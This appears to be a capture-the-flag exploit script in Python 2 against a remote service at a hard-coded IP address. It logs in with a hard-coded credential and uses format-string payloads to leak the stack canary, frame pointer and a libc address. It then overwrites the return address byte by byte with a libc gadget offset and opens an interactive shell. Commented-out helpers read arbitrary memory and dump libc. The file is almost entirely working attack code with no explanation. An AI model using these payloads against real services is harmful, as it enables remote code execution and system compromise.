import socket, struct, os, binascii, base64
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)

# def read_canary_libc(sc):
    # read_until(sc, "3. Exit the battle")
    # sc.send("2\n")
    # sc.send("|||%23$p|%33$p|||\n")
    # read_until(sc, "|||")
    # res = read_until(sc, "|||").split("|")

    # return int(res[0][2:], 16), int(res[1][2:], 16)
    

# def read_memory(sc, address):
    # read_until(sc, "3. Exit the battle")
    # sc.send("2\n")
    # sc.send("|||%8$s|||\x00     " + Q(address))
    # read_until(sc, "|||")
    # res = read_until(sc, "|||")
    # return res


# def find_libc_base(sc, libc_seek):
    # while True:
        # libc_seek = libc_seek & 0xfffffffffffff000
        
        # res = read_memory(sc, libc_seek)
        # print hex(libc_seek), repr(res)
        # if res.startswith("\x7fELF"):
            # return libc_seek
        # libc_seek -= 0x1000

# def dump_libc(sc, libc_base):
    # filename = "libcdump.so"
    # index = libc_base 
    # if os.path.isfile(filename):
        # index += os.path.getsize(filename)
        
    # while True:
        # res = read_memory(sc, index)
        # print hex(index), repr(res)
        # open(filename, "ab").write(res + "\x00")
        # index += len(res) + 1
        
sc = socket.create_connection(("146.185.132.36", 12431))
read_until(sc, "Credential : ")
sc.send("7h15_15_v3ry_53cr37_1_7h1nk")
read_until(sc, "1) admin action")
sc.send("1\n")
read_until(sc, "Give me your command : ")

# canary = 137
# rbp = 138
# return = 139

s = "|||%137$llx|%138$llx|%153$llx|||"
s = s.ljust(255, " ")
s += "\x00" + "qqqqqqqqqq"
sc.send(s)
read_until(sc, "|||")
res = read_until(sc, "|||")
canary, main_rbp, libc_leak = (int(x, 16) for x in res.split("|"))
libc_base = libc_leak - (0x7fa0815d1830 - 0x7fa0815b1000)

print hex(canary)
print hex(main_rbp)
print hex(libc_base)

read_until(sc, "1) admin action")
sc.send("1\n")
read_until(sc, "Give me your command : ")

s = "|||%72$s|||"
s = s.ljust(511, " ")
s += "\x00" + Q(main_rbp + 8)
sc.send(s)
read_until(sc, "|||")
res = read_until(sc, "|||")
print binascii.b2a_hex(res)

targetaddr = libc_base + 0xf1117

for i in xrange(8):
    print "."
    read_until(sc, "1) admin action")
    sc.send("1\n")
    read_until(sc, "Give me your command : ")

    s = "X" * ((targetaddr >> (8*i)) & 0xff) + "%72$hn"
    s = s.ljust(511, " ")
    s += "\x00" + Q(main_rbp + 8 + i)
    sc.send(s)

read_until(sc, "1) admin action")
sc.send("1\n")
read_until(sc, "Give me your command : ")

s = "|||%72$s|||"
s = s.ljust(511, " ")
s += "\x00" + Q(main_rbp + 8)
sc.send(s)
read_until(sc, "|||")
res = read_until(sc, "|||")
print binascii.b2a_hex(res)

read_until(sc, "1) admin action")
sc.send("0\n")

t = telnetlib.Telnet()                                                  
t.sock = sc
t.interact()  

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
    